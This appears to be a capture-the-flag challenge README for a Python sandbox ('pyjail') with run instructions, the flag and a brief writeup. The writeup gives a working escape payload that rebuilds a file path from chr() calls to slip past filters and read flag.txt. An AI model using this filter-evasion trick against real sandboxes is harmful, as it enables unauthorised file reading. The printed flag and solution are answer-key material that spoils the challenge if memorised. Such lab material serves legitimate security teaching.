# ML Pyjail 1

> Warning:
>
> Need to change the flag to fake flag

### How to run ?

```shell
docker-compose up
```
#### Linux

```shell
netcat localhost 4444
```

#### Windows
```powershell
ncat.exe localhost 4444
```

### Description

An AI-powered fortress guards a treasure trove of forbidden knowledge. Legends speak of a mystical combination of Machine Learning and Python code, interwoven with an impenetrable pyjail defense mechanism. Your mission, should you accept it, is to breach this formidable barrier and unearth the secrets hidden within. Good luck


Flag Format: PCTF{}

### Flag
PCTF{M@chin3_1earning_d0_be_tR@nsformati0na1_1818726356}

### Difficulty
2/10 (Very Easy)

### Author
sans909 (Sanskar)


### Tester
- Txnn3r (Tanner Leventry)


### Writeup

```python
a = './Mljail/flag.txt'
s = ""
for c in a:
  s += f"chr({str(ord(c))})+"
print(s[:-1])
```

Exploit:
```python
print(open(chr(46)+chr(47)+chr(77)+chr(76)+chr(106)+chr(97)+chr(105)+chr(108)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116), 'r').read())
```

# Data Retrieved From

- https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
